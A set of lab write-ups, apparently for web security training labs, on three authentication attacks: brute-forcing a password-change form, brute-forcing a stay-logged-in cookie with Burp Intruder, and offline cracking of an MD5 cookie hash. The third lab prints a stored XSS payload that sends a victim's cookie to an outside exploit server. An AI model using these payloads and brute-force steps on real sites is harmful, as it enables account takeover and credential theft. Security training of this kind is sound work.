**Other mechanisms include** -
**1. Reset password functionality** :- 

a) forgot password

b) change password

**2. Remember me functionality.**

**3. Lock out mechanism.**

**1st- Lab Write-Up: Password brute-force via password change**

**Step 1: Initial Setup**

Configure Burp Suite and ensure your browser is properly set up to route traffic through the proxy.

Access the lab and log in using the provided credentials.

**Step 2: Observing the Password Change Functionality**

Navigate to the "Change Password" feature on the application.

Note that the form requires three fields:

Current Password

New Password

Confirm New Password

Perform the following observations:

When you submit an incorrect Current Password with matching New Password and Confirm New Password, the account gets blocked after multiple attempts.

When you provide the correct Current Password but different values for New Password and Confirm New Password, the application throws an error message:
"New passwords don’t match."

**Step 3: Exploiting the Functionality**

Recognize that the error message for mismatched new passwords can help identify the correct Current Password.

Use Burp Suite to capture the POST request for changing the password:

Send the request to the Intruder tool.

Modify the username parameter to target the victim username carlos.

Set the current-password parameter as the payload position.

**Step 4: Configuring the Intruder Attack**

In Payloads, upload a wordlist of potential passwords for the current-password parameter.

In Grep – Match settings:

Add the string "New passwords don’t match" to identify successful guesses.

Start the attack.

**Step 5: Analyzing the Results**

Observe the responses in the attack results. Under the "New passwords don’t match" column, look for the payload that triggers this message.
Identify the correct password for carlos (in this case, 123456).

**Step 6: Logging In**

Use the identified password (123456) to log in as carlos.

Successfully solve the lab!

Key Takeaways

This attack leverages a logic flaw in the password change functionality, allowing brute force attempts without account lockout.

The error messages provide unintended feedback, aiding in identifying valid credentials.

Always validate and handle error messages securely to prevent information disclosure.

**2nd - Lab: Brute-forcing a stay-logged-in cookie**

Your credentials: wiener:peter

Victim's username: carlos

**1. Log in to your account**

Enable the "Stay logged in" option.

Notice that a stay-logged-in cookie is created.

**2.Inspect the cookie**

Use Burp's Inspector panel to view the cookie.

Decode it (Base64) and observe its format: username:md5HashOfPassword.

**3.Verify the hash**

Hash your password using MD5.

Check if the hash matches the second part of the decoded cookie.

Confirm that the cookie format is base64(username + ':' + md5HashOfPassword).

**4.Log out and send the request to Burp Intruder**

Log out of your account.

Find the most recent GET /my-account?id=wiener request in Burp.

Highlight the stay-logged-in cookie and send the request to Intruder.

**5.Set up Burp Intruder**

Ensure the stay-logged-in cookie is set as the payload position.

Add your own password as a payload (for testing).

Add these Payload Processing Rules:
Hash: MD5

Add Prefix: wiener:

Encode: Base64
![Screenshot from 2024-11-29 17-21-27](https://github.com/user-attachments/assets/21f087e9-4976-4697-8646-86e740e6555e)

**6.Add a response check**

In Intruder, add a grep match rule to flag responses containing the string Update email.

**7.Run the attack**

Start the attack and confirm that a valid payload allows access to your account.
![Screenshot from 2024-11-29 17-21-27](https://github.com/user-attachments/assets/bb0e007a-da43-403b-bcad-61a2a7a01152)

**8.Adjust for Carlos's account**

Replace your password with a list of candidate passwords.

Change the id parameter in the request URL from wiener to carlos.

Update the Add Prefix rule to use carlos: instead of wiener:.

**9.Run the attack again**

Start the attack.

Look for the response containing the Update email button.

The payload in this response is the valid stay-logged-in cookie for Carlos's account.

**Lab Solved**
![Screenshot from 2024-11-29 17-20-38](https://github.com/user-attachments/assets/69ee33c1-e01a-49f9-8611-5810db97b232)

Use the payload to access Carlos's account.

**3rd Lab**

**Lab: Offline password cracking**

Your credentials: wiener:peter

Victim's username: carlos

**1.Investigate the Stay logged in functionality**

Log in to your account with Burp running.

Notice that the stay-logged-in cookie is Base64 encoded.

Go to Proxy > HTTP history in Burp, find the response to your login request, and highlight the stay-logged-in cookie.

Observe that the cookie is constructed as:
username + ':' + md5HashOfPassword.

**2.Identify the XSS vulnerability**

Notice that the comment functionality on the blog is vulnerable to stored XSS.

**3.Get your exploit server URL**

Go to the exploit server and note down the exploit server URL.

**4.Post the XSS payload**

Go to one of the blog pages and post the following comment:
html

Copy code

**"<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>"**

Replace YOUR-EXPLOIT-SERVER-ID with your actual exploit server ID.

**5.Capture the victim's cookie**

Open the access log on your exploit server.

Look for a GET request from the victim that includes their stay-logged-in cookie.

![Screenshot from 2024-11-29 17-53-18](https://github.com/user-attachments/assets/82e485ed-08a6-45b3-9fa6-5b846a3b3075)

**6.Decode the cookie**

Copy the victim's stay-logged-in cookie and decode it using Burp Decoder.

The decoded value will be in the format:
username:md5HashOfPassword

Example: carlos:26323c16d5f4dabff3bb136f2460a943.

**7.Find the victim's password**

Copy the MD5 hash (second part of the cookie) and search for it in a search engine.
The password for the hash should be revealed. Example: onceuponatime.

**8.Log in to the victim's account**

Use the victim's username (carlos) and the password you found to log in to their account.

**9.Delete the victim's account**

Go to the "My account" page in the victim's account.
Delete their account to solve the lab.
![Screenshot from 2024-11-29 17-52-24](https://github.com/user-attachments/assets/a8838cd5-1eac-4700-a566-50fff9842d55)

![Screenshot from 2024-11-29 17-52-53](https://github.com/user-attachments/assets/81ceb249-71a6-4bf4-a201-cf02175b1554)

